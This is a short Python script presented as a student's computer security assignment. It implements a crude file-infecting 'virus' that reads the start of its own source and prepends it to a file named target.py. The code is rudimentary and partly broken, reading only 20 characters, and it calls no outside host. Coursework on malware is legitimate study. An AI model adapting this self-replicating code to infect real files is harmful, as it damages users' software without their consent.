" Created by Evaldas Senavaitis 1402039 "

" Computer Security 1st programming assignment "

import os,sys

running = repr(sys.argv[0]) # Getting directory in which .py file
name=os.path.basename(running) # Getting only a basename from directory
Virus = open(name[:-1], "r") # Stripping last char from basename
Virus20 = Virus.read(20)
target = open("target.py", "r+") #Opening for reading and writing
target_r = target.read()
target.seek(0) # getting to the begging of the file
target.write(Virus20+'\n'+target_r) # Appending Virus code to the beggining of the target
target.close()
